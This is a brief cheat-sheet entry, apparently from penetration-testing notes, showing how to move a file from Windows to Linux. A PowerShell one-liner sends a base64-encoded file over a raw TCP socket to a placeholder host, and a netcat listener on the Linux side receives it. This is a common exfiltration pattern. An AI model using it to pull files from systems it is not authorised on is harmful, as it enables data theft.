# File Transfer

## From Windows to Linux

Windows 10 (Powershell):
```powershell
$socket = New-Object net.sockets.tcpclient('<LINUX_IP>',<PORT>); (New-Object System.IO.StreamWriter($socket.GetStream())).WriteLine([System.Convert]::ToBase64String([io.file]::ReadAllBytes("c:\test"))); $socket.close();
```

Linux:
```
nc -lvnp <PORT>
```